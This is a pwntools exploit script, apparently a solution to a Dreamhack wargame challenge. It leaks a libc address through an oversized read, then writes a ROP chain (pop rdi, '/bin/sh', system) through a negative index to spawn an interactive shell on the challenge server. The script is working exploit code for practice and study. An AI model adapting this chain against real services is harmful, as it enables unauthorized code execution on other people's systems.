from pwn import *

#context.log_level = 'debug'

# libc extracted from docker server
libc_path = '../../libc/libc1997.so.6'
libc = ELF(libc_path)
libc_rop = ROP(libc)


#p = remote('localhost', 1000)
p = remote('host8.dreamhack.games', 20138)


###########################################
# 1: leak libc + canary

# create
for _ in range(10):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b'size', b'40') #0x28
    p.sendafter(b'data', b'A'*0x28)

# update
p.sendlineafter(b'>', b'3')
p.sendlineafter(b'index', b'9')
p.sendlineafter(b'size', b'72')

# read
p.sendlineafter(b'>', b'2')
p.sendlineafter(b'index: ', b'9')
libc_leak = u64(p.recv(72)[-8:])

# libc leak
libc_leak_offset = libc.symbols['__libc_start_main'] - 0x36
libc_base = libc_leak - libc_leak_offset
print(f"leaked libc_base: {libc_base:#x}")


###########################################
# 2: exploit ROP
rop_pop_ret = libc_base + libc_rop.find_gadget(['pop rdi', 'ret'])[0]
binsh = libc_base + next(libc.search(b'/bin/sh\x00'))
rop_system = libc_base + libc.symbols['system'] + 0x1B
# adding offset 0x1B: locates the $rip to 'call sub_582C0', not 'jmp sub_582C0'.
# This avoids stack alignment issues.

payload = b'A'*16 + p64(rop_pop_ret) + p64(binsh) + p64(rop_system)

p.sendlineafter(b'>', b'3')
p.sendlineafter(b'index', b'-2')
p.sendlineafter(b'size', b'40')
p.sendafter(b'data: ', payload)

p.interactive()